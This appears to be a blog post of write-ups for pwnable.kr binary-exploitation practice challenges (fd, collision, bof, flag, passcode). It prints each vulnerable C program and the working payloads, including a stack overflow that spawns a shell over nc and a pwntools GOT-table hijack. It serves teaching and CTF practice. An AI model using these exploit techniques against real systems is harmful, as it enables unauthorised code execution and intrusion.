[{"content":"If you are interested in pwn or binary exploitation challenges, pwnable.kr is a great platform to test your skills. Unlike traditional CTF games on ctftime, pwnable.kr does not have a time limit, allowing you to work on the challenges at your own pace.\nIn my opinion, this platform may not be the best choice for total beginners. It is more suitable for those who have some computer science background, understand how systems and programs work, and are interested in learning more about hacking and pwn.\nIn this article, I will share my experience solving each challenge on pwnable.kr, as well as what I have learned along the way.\nfd - 1 pt // fd.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; char buf[32]; int main(int argc, char* argv[], char* envp[]){ if(argc\u0026lt;2){ printf(\u0026#34;pass argv[1] a number\\n\u0026#34;); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(\u0026#34;LETMEWIN\\n\u0026#34;, buf)){ printf(\u0026#34;good job :)\\n\u0026#34;); system(\u0026#34;/bin/cat flag\u0026#34;); exit(0); } printf(\u0026#34;learn about Linux file IO\\n\u0026#34;); return 0; } We noticed that if buf == LETMEWIN then the program will start a new subprocess to execute \u0026quot;/bin/cat flag\u0026quot;. We can see the permission of the compiled file fd and flag are\n-r-sr-x--- 1 fd_pwn fd 7322 Jun 11 2014 fd -r--r----- 1 fd_pwn root 50 Jun 11 2014 flag This permission tells us that when we run fd as fd users, the euid of the process will be fd_pwn, which is good enough to read flag.\nNow it is quite clear on how to pwn this program.\nif(!strcmp(\u0026quot;LETMEWIN\\n\u0026quot;, buf)) -\u0026gt; let the string in buf equals to \u0026ldquo;LETMEWIN\\n\u0026rdquo;, so that the program can help us read the flag len = read(fd, buf, 32); -\u0026gt; let fd equals to 0 so that we can fill buf via standard input. int fd = atoi( argv[1] ) - 0x1234; let argv[1] equals 4660 (decimal representation of 0x1234) to make fd 0. final payload: echo \u0026#34;LETMEWIN\u0026#34; | ./fd $(python -c \u0026#34;print(0x1234)\u0026#34;) ps: echo adds a \\n by default.\ncollision - 3 pt // col.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; unsigned long hashcode = 0x21DD09EC; unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i\u0026lt;5; i++){ res += ip[i]; } return res; } int main(int argc, char* argv[]){ if(argc\u0026lt;2){ printf(\u0026#34;usage : %s [passcode]\\n\u0026#34;, argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(\u0026#34;passcode length should be 20 bytes\\n\u0026#34;); return 0; } if(hashcode == check_password( argv[1] )){ system(\u0026#34;/bin/cat flag\u0026#34;); return 0; } else printf(\u0026#34;wrong passcode.\\n\u0026#34;); return 0; } To successfully run the program, we must provide 20 bytes as the first argument. The check_password function takes 20 bytes(the first argument), splits them into five groups of four bytes each, and treats each group as an integer. This gives us five integers in total. If the sum of these five integers equals the pre-defined hashcode value of 0x21DD09EC, then the flag will be printed. By performing some calculations, we can determine that the five integers needed to match hashcode are 0x6c5cec8,0x6c5cec8,0x6c5cec8,0x6c5cec8,0x6c5cecc. Considering the little endian byte order, we can construct our final payload accordingly.\nfinal payload:\necho -en \u0026#34;\\xc8\\xce\\xc5\\x06\\xc8\\xce\\xc5\\x06\\xc8\\xce\\xc5\\x06\\xc8\\xce\\xc5\\x06\\xcc\\xce\\xc5\\x06\u0026#34; | xargs ./col bof - 5 pt // bof.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void func(int key){ char overflowme[32]; printf(\u0026#34;overflow me : \u0026#34;); gets(overflowme);\t// smash me! if(key == 0xcafebabe){ system(\u0026#34;/bin/sh\u0026#34;); } else{ printf(\u0026#34;Nah..\\n\u0026#34;); } } int main(int argc, char* argv[]){ func(0xdeadbeef); return 0; } Classic stack buffer overflow. The root cause of the stack overflow is that the function designed to take user input, such as read, is longer than what it was intended to hold. Here we have gets, this function takes unlimited number of characters whereas overflowme array can only hold upto 32 bytes. In general, we can use a bof vulnerability to manipulate the rip or instruction pointer to control the program flow. However, in this case, the solution is simpler. All we need to do is change the key to 0xcafebabe to exploit this program. Since key is an argument rather than a local variable, we can overwrite the buffer overflowme from the beginning to the rbp/ebp+8 to change its value. It is important to note that system(\u0026quot;/bin/sh\u0026quot;) is a subprocess that will terminate when the parent process ends. Therefore, we use the cat trick to obtain a persistent shell.\nfinal payload:\n(echo -en \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xbe\\xba\\xfe\\xca\u0026#34;; cat) | nc pwnable.kr 9000 flag - 7 pt This challenge is a reverse enginnering challenge. The flag is in the binary itself.\nRun file flag to get some basic info about this file\nflag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header An ELF with no section header looks suspecious. Then we run strings flag to see whether there is something interesting inside.\nUPX! ... $Info: This file is packed with the UPX executable packer http://upx.sf.net $ $Id: UPX 3.08 Copyright (C) 1996-2011 the UPX Team. All Rights Reserved. $ ... UPX! UPX! ... Boom! It\u0026rsquo;s UPX. We can unpack it by running upx -d flag\nUltimate Packer for eXecutables Copyright (C) 1996 - 2020 UPX 3.96 Markus Oberhumer, Laszlo Molnar \u0026amp; John Reiser Jan 23rd 2020 File size Ratio Format Name -------------------- ------ ----------- ----------- 883745 \u0026lt;- 335288 37.94% linux/amd64 flag Unpacked 1 file. Now put the unpacked file into idapro, understand that all this program do is to copy a string (our flag) to a malloc address. We can use gdb to dynamically check the string stored at that malloc address to get the flag.\n0x0000000000401180 in main () 1: x/10i $rip =\u0026gt; 0x401180 \u0026lt;main+28\u0026gt;: mov QWORD PTR [rbp-0x8],rax 0x401184 \u0026lt;main+32\u0026gt;: mov rdx,QWORD PTR [rip+0x2c0ee5] # 0x6c2070 \u0026lt;flag\u0026gt; 0x40118b \u0026lt;main+39\u0026gt;: mov rax,QWORD PTR [rbp-0x8] 0x40118f \u0026lt;main+43\u0026gt;: mov rsi,rdx 0x401192 \u0026lt;main+46\u0026gt;: mov rdi,rax 0x401195 \u0026lt;main+49\u0026gt;: call 0x400320 0x40119a \u0026lt;main+54\u0026gt;: mov eax,0x0 0x40119f \u0026lt;main+59\u0026gt;: leave 0x4011a0 \u0026lt;main+60\u0026gt;: ret 0x4011a1: nop (gdb) p/x $rax \u0026lt;- the address that malloc gives us $2 = 0x6c96b0 ... 0x000000000040119a in main () 1: x/10i $rip =\u0026gt; 0x40119a \u0026lt;main+54\u0026gt;: mov eax,0x0 0x40119f \u0026lt;main+59\u0026gt;: leave 0x4011a0 \u0026lt;main+60\u0026gt;: ret 0x4011a1: nop 0x4011a2: nop 0x4011a3: nop 0x4011a4: nop 0x4011a5: nop 0x4011a6: nop 0x4011a7: nop (gdb) x/s 0x6c96b0 \u0026lt;- check what\u0026#39;s in this address 0x6c96b0: \u0026#34;UPX...? sounds like a delivery service :)\u0026#34; passcode - 10 pt // passcode.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void login(){ int passcode1; int passcode2; printf(\u0026#34;enter passcode1 : \u0026#34;); scanf(\u0026#34;%d\u0026#34;, passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(\u0026#34;enter passcode2 : \u0026#34;); scanf(\u0026#34;%d\u0026#34;, passcode2); printf(\u0026#34;checking...\\n\u0026#34;); if(passcode1==338150 \u0026amp;\u0026amp; passcode2==13371337){ printf(\u0026#34;Login OK!\\n\u0026#34;); system(\u0026#34;/bin/cat flag\u0026#34;); } else{ printf(\u0026#34;Login Failed!\\n\u0026#34;); exit(0); } } void welcome(){ char name[100]; printf(\u0026#34;enter you name : \u0026#34;); scanf(\u0026#34;%100s\u0026#34;, name); printf(\u0026#34;Welcome %s!\\n\u0026#34;, name); } int main(){ printf(\u0026#34;Toddler\u0026#39;s Secure Login System 1.0 beta.\\n\u0026#34;); welcome(); login(); // something after login... printf(\u0026#34;Now I can safely trust you that you have credential :)\\n\u0026#34;); return 0; } Upon auditing the code, we can find that the problem is scanf(\u0026quot;%d\u0026quot;, passcode1) (as well as scanf(\u0026quot;%d\u0026quot;, passcode2)). The intended behavior is to use scanf(\u0026quot;%d\u0026quot;, \u0026amp;passcode1) instead. In the current code, the value of passcode1 is being interpreted as an address, and the input from standard input is being saved to the address stored in passcode1. As passcode1 is not initialized, its value will be whatever is on the stack, which in most cases will be a polluted value. In this challenge, we can take advantage of the name array in the welcome function to pollute this value. By checking the assembly code of the ELF we can see that name starts at ebp-0x70 and the address of password1 is ebp-0x10. We can input 96 bytes as padding and 4 bytes as the value of passcode1, which will be the address to have our next input by scanf(\u0026quot;%d\u0026quot;, passcode1)\nNow we have the ability to write data to arbitary address, what address is the most interesting one? Here we decide to hijack GOT table.\nreadelf -a passcode ... 0804a004 00000207 R_386_JUMP_SLOT 00000000 fflush@GLIBC_2.0 ... objdump -d -M intel passcode ... 80485e3:\tc7 04 24 af 87 04 08 mov DWORD PTR [esp],0x80487af 80485ea:\te8 71 fe ff ff call 8048460 \u0026lt;system@plt\u0026gt; ... We overwrite 0x080485e3 to 0x0804a004 to trick the program so that when the program calls fflush(), it actually runs system(\u0026quot;/bin/cat flag\u0026quot;)\nfinal payload:\n# payload for passcode from pwn import * p = process(\u0026#39;/home/passcode/passcode\u0026#39;) padding = b\u0026#39;A\u0026#39; * 96 addr = p32(0x0804a004) target = bytes(int(\u0026#39;0x080485e3\u0026#39;, base=16)) payload = padding + addr + b\u0026#39;\\n\u0026#39; + target + b\u0026#39;\\n\u0026#39; + b\u0026#39;1\\n\u0026#39; p.send(payload) p.interactive() There are something we need to pay attention to when we hijack GOT table.\nThe reason why we can make use of 0x0804a004 and 0x080485e3 is because this program compiles with NO PIE, otherwise these address will be relative offsets and we can\u0026rsquo;t use them directly. We can only hijack GOT table when the security settings is Partial RELRO. If it is set to Full RELRO we won\u0026rsquo;t have write permission to hijack GOT table. By hijacking the GOT table, we can make the program BELIEVE that system(\u0026quot;/bin/cat flag\u0026quot;) IS fflush(). However, this challenge is tailored to take advantage of fflush. In a real-world program, fflush may be used somewhere else and play a critical role in the program. When we hijack the GOT table, we are likely to crash the program before it reaches the point where we hope to use the hijacked functions. In this case we cannot use this trick. scanf(\u0026quot;%d\u0026quot;, passcode1) requires we input an integer as an address, hence we cannot input something like 0x080485e3. Instead, we need to convert it to decimal (that\u0026rsquo;s why we have bytes(int()) in the payload) to get the correct result. Another thing I learned from this challenge is the difference between PIE and ASLR. I consulted with robwaz. Here is his perfect explanation.\nThis is a common misunderstanding. PIE != ASLR PIE randomizes the location the binary is loaded into memory. This impacts the code location, which you have observed is constant. ASLR randomizes other memory mapped into the binary at runtime, such as the stack, heap, etc. They serve a very similar purpose, but they are in fact two different mechanism. PIE is something that is determined at compile time. The binary must be compiled to be a position independent executable. This means the addresses referenced inside the assembly of the binary are all relative. Which allows the binary to be ran while loaded at different location offsets. ASLR is something done at run time when memory is mapped. It randomizes part of the memory addresses. This can be done to any binary with no impact, as a binary references the stack, heap, etc based on values it observes while running (or relatively). TBC\n","permalink":"https://0xlightyear.github.io/posts/pwnable_kr_writeups/","summary":"If you are interested in pwn or binary exploitation challenges, pwnable.kr is a great platform to test your skills. Unlike traditional CTF games on ctftime, pwnable.kr does not have a time limit, allowing you to work on the challenges at your own pace.\nIn my opinion, this platform may not be the best choice for total beginners. It is more suitable for those who have some computer science background, understand how systems and programs work, and are interested in learning more about hacking and pwn.","title":"pwnable.kr Writeups"}]